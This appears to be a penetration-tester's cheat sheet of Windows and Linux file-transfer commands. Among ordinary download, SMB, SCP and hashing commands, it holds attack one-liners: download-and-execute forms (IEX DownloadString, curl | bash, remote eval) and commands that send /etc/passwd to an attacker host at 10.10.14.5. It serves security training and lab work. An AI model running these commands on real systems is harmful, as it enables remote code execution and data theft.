---
tags: [cheatsheet, file-transfers, windows, linux, download, upload, evasion]
---

# File Transfers - Complete Command Reference

## Windows Download Methods

| Method | Command |
|--------|---------|
| PowerShell WebClient | (New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe', 'C:\temp\file.exe') |
| PowerShell WebClient (String) | (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1') |
| PowerShell Invoke-WebRequest | Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile file.exe |
| PowerShell Invoke-WebRequest (Short) | iwr -uri http://10.10.14.5/file.exe -OutFile file.exe |
| PowerShell with Chrome UA | Invoke-WebRequest http://file.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "file.exe" |
| Bitsadmin | bitsadmin /transfer job /download /priority high http://10.10.14.5/file.exe C:\temp\file.exe |
| Certutil | certutil -urlcache -f http://10.10.14.5/file.exe file.exe |
| Certutil (split) | certutil -split -f http://10.10.14.5/file.bin file.bin |
| BITSAdmin (legacy) | bitsadmin /transfer n http://10.10.14.5/nc.exe C:\Temp\nc.exe |

---

## Windows Upload Methods

| Method | Command |
|--------|---------|
| PowerShell POST | Invoke-WebRequest -Uri http://10.10.14.5:443 -Method POST -Body $b64 |
| PowerShell WebClient Upload | (New-Object Net.WebClient).UploadFile('ftp://10.10.14.5/file.txt', 'C:\file.txt') |
| SMB Upload | copy C:\file.exe \\10.10.14.5\share\ |
| FTP Upload | (New-Object Net.WebClient).UploadFile('ftp://10.10.14.5/file.txt', 'C:\file.txt') |

---

## Windows Fileless Execution

| Method | Command |
|--------|---------|
| PowerShell IEX | IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1') |
| PowerShell IEX Pipeline | (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1') | IEX |
| Certutil to Memory | certutil -urlcache -f http://10.10.14.5/script.ps1 %temp%\script.ps1 & powershell -ep bypass -f %temp%\script.ps1 |

---

## Windows Base64 Operations

| Operation | Command |
|-----------|---------|
| Encode File | [Convert]::ToBase64String((Get-Content -path "C:\file.txt" -Encoding byte)) |
| Decode File | [IO.File]::WriteAllBytes("C:\file.txt", [Convert]::FromBase64String("BASE64")) |
| Verify Hash | Get-FileHash C:\file.txt -Algorithm MD5 |

---

## Linux Download Methods

| Method | Command |
|--------|---------|
| Wget | wget http://10.10.14.5/file.sh -O /tmp/file.sh |
| Wget (quiet) | wget -q http://10.10.14.5/file.sh -O /tmp/file.sh |
| Wget (resume) | wget -c http://10.10.14.5/largefile.iso -O /tmp/largefile.iso |
| Curl | curl -o /tmp/file.sh http://10.10.14.5/file.sh |
| Curl (follow redirects) | curl -L -o /tmp/file.sh http://bit.ly/shortlink |
| Curl (same name) | curl -O http://10.10.14.5/file.sh |
| Curl (with headers) | curl -H "User-Agent: Mozilla/5.0" -o file.sh http://10.10.14.5/file.sh |
| PHP | php -r 'file_put_contents("file.sh", file_get_contents("http://10.10.14.5/file.sh"));' |
| Python3 | python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.14.5/file.sh", "file.sh")' |
| Python2 | python2 -c 'import urllib; urllib.urlretrieve("http://10.10.14.5/file.sh", "file.sh")' |
| Ruby | ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("http://10.10.14.5/file.sh")))' |
| Perl | perl -e 'use LWP::Simple; getstore("http://10.10.14.5/file.sh", "file.sh");' |
| Bash /dev/tcp | exec 3<>/dev/tcp/10.10.14.5/80; echo -e "GET /file.sh HTTP/1.1\n\n" >&3; cat <&3 > file.sh |

---

## Linux Upload Methods

| Method | Command |
|--------|---------|
| Curl POST | curl -F "file=@/etc/passwd" http://10.10.14.5:8000/upload |
| Curl PUT | curl -T /etc/passwd http://10.10.14.5:8080/uploads/passwd |
| SCP Upload | scp /etc/passwd user@10.10.14.5:/tmp/ |
| SCP Upload (port) | scp -P 2222 file user@10.10.14.5:/remote/ |
| Rsync | rsync -avz file user@10.10.14.5:/tmp/ |
| Netcat (send) | nc -q 0 10.10.14.5 4444 < file |
| Netcat (receive) | nc -lvnp 4444 > received_file |

---

## Linux Fileless Execution

| Method | Command |
|--------|---------|
| Curl to Bash | curl http://10.10.14.5/script.sh | bash |
| Wget to Bash | wget -qO- http://10.10.14.5/script.sh | bash |
| Curl to Python | curl http://10.10.14.5/script.py | python3 |
| PHP Fileless | php -r 'eval(file_get_contents("http://10.10.14.5/script.php"));' |
| Ruby Fileless | ruby -e 'require "net/http"; eval(Net::HTTP.get(URI.parse("http://10.10.14.5/script.rb")))' |

---

## Linux Base64 Operations

| Operation | Command |
|-----------|---------|
| Encode File | base64 -w0 file.txt > encoded.txt |
| Decode File | base64 -d encoded.txt > file.txt |
| Encode with Progress | pv file.bin | base64 -w0 > encoded.b64 |

---

## SCP/SSH Methods

| Operation | Command |
|-----------|---------|
| Upload File | scp localfile user@target:/remote/path/ |
| Download File | scp user@target:/remote/file localfile |
| Upload Directory | scp -r localdir user@target:/remote/path/ |
| Download Directory | scp -r user@target:/remote/dir localdir |
| SCP with Key | scp -i key.pem file user@target:/path/ |
| SFTP Upload | echo "put file" | sftp user@target |

---

## Netcat/Ncat Methods

| Operation | Command |
|-----------|---------|
| Netcat Receive | nc -lvnp 4444 > received_file |
| Netcat Send | nc -q 0 TARGET-IP 4444 < file_to_send |
| Ncat Receive | ncat -l -p 4444 --recv-only > file |
| Ncat Send | ncat --send-only TARGET-IP 4444 < file |
| Ncat SSL Receive | ncat --ssl -lvnp 4444 --recv-only > file |
| Ncat SSL Send | ncat --ssl --send-only TARGET-IP 4444 < file |
| Directory Transfer (tar) | tar cf - /dir | nc -lvnp 4444 |

---

## SMB Methods

| Operation | Command |
|-----------|---------|
| Start SMB Server (Linux) | sudo impacket-smbserver share /tmp/smbshare -smb2support |
| Start SMB with Auth | sudo impacket-smbserver share /tmp/smbshare -user test -password test |
| Mount SMB (Windows) | net use Z: \\10.10.14.5\share /user:test test |
| Copy from SMB | copy \\10.10.14.5\share\file.exe C:\temp\ |
| Copy to SMB | copy C:\file.exe \\10.10.14.5\share\ |

---

## FTP Methods

| Operation | Command |
|-----------|---------|
| Start FTP Server | sudo python3 -m pyftpdlib --port 21 |
| FTP with Write | sudo python3 -m pyftpdlib --port 21 --write |
| FTP Download (PS) | (New-Object Net.WebClient).DownloadFile('ftp://10.10.14.5/file.txt', 'file.txt') |
| FTP Upload (PS) | (New-Object Net.WebClient).UploadFile('ftp://10.10.14.5/file.txt', 'C:\file.txt') |
| FTP Script | echo open 10.10.14.5 > ftp.txt; echo USER anonymous >> ftp.txt; echo GET file >> ftp.txt; ftp -s:ftp.txt |

---

## WebDAV Methods

| Operation | Command |
|-----------|---------|
| Start WebDAV (Linux) | sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous |
| Mount WebDAV (Windows) | net use Z: \\10.10.14.5\DavWWWRoot |
| Copy to WebDAV | copy file.exe \\10.10.14.5\DavWWWRoot\ |
| Mount WebDAV (Linux) | sudo mount -t davfs http://10.10.14.5 /mnt/webdav |

---

## RDP File Transfer

| Operation | Command |
|-----------|---------|
| rdesktop with mount | rdesktop 10.10.10.132 -d DOMAIN -u user -p pass -r disk:linux='/local/path' |
| xfreerdp with mount | xfreerdp /v:10.10.10.132 /d:DOMAIN /u:user /p:pass /drive:linux,/local/path |
| Access mounted drive | \\tsclient\linux |

---

## PowerShell Remoting (WinRM)

| Operation | Command |
|-----------|---------|
| Test WinRM | Test-NetConnection -ComputerName TARGET -Port 5985 |
| Create Session | $Session = New-PSSession -ComputerName TARGET |
| Copy to Remote | Copy-Item -Path C:\local.txt -ToSession $Session -Destination C:\remote.txt |
| Copy from Remote | Copy-Item -Path C:\remote.txt -Destination C:\local.txt -FromSession $Session |
| Invoke-Command Transfer | Invoke-Command -Session $Session -ScriptBlock { [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file.exe")) } |

---

## HTTP Server Setup

| Method | Command |
|--------|---------|
| Python3 HTTP Server | python3 -m http.server 8000 |
| Python2 HTTP Server | python2 -m SimpleHTTPServer 8000 |
| Python Upload Server | pip3 install uploadserver; python3 -m uploadserver |
| Python HTTPS Server | python3 -c "import http.server, ssl; httpd = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler); httpd.socket = ssl.wrap_socket(httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True); httpd.serve_forever()" |
| PHP Server | php -S 0.0.0.0:8000 |
| Ruby Server | ruby -run -ehttpd . -p8000 |

---

## Nginx PUT Server

| Step | Command |
|------|---------|
| Create dir | sudo mkdir -p /var/www/uploads; sudo chown www-data:www-data /var/www/uploads |
| Config | sudo nano /etc/nginx/sites-available/upload (see notes for config) |
| Enable | sudo ln -s /etc/nginx/sites-available/upload /etc/nginx/sites-enabled/ |
| Test | sudo nginx -t |
| Restart | sudo systemctl restart nginx |
| Upload | curl -T /etc/passwd http://localhost/uploads/passwd |

Nginx config:
server {
    listen 8080;
    location /uploads/ {
        root /var/www/;
        dav_methods PUT;
    }
}

---

## Encryption Methods

| Operation | Command |
|-----------|---------|
| OpenSSL Encrypt | openssl enc -aes256 -pbkdf2 -iter 100000 -in file -out file.enc |
| OpenSSL Decrypt | openssl enc -d -aes256 -pbkdf2 -iter 100000 -in file.enc -out file |
| GPG Symmetric | gpg --symmetric --cipher-algo AES256 file |
| GPG Decrypt | gpg --decrypt file.gpg > file |
| 7-Zip Encrypt | 7z a -pPassword -mhe archive.7z file |
| 7-Zip Decrypt | 7z x -pPassword archive.7z |
| PowerShell Encrypt | Invoke-AESEncryption -Mode Encrypt -Key "pass" -Path file |
| PowerShell Decrypt | Invoke-AESEncryption -Mode Decrypt -Key "pass" -Path file.aes |

---

## Integrity Verification

| Operation | Command |
|-----------|---------|
| MD5 (Linux) | md5sum file |
| MD5 (Windows) | certutil -hashfile file MD5 |
| SHA256 (Linux) | sha256sum file |
| SHA256 (Windows) | Get-FileHash file -Algorithm SHA256 |
| GPG Sign | gpg --detach-sign file |
| GPG Verify | gpg --verify file.sig file |

---

## Key Takeaways - Quick Reference

- **PowerShell download**: `(New-Object Net.WebClient).DownloadFile('url', 'file')`
- **PowerShell fileless**: `IEX (New-Object Net.WebClient).DownloadString('url')`
- **PowerShell upload**: `Invoke-WebRequest -Uri http://server -Method POST -Body $b64`
- **Wget download**: `wget http://server/file -O /tmp/file`
- **Curl download**: `curl -o /tmp/file http://server/file`
- **Curl upload**: `curl -T file http://server/upload`
- **SCP**: `scp file user@target:/path/`
- **Netcat receive**: `nc -lvnp 4444 > file`
- **Netcat send**: `nc -q 0 target 4444 < file`
- **SMB server**: `impacket-smbserver share . -smb2support`
- **Base64 encode**: `base64 -w0 file`
- **Base64 decode**: `base64 -d file`
- **OpenSSL encrypt**: `openssl enc -aes256 -in file -out file.enc`
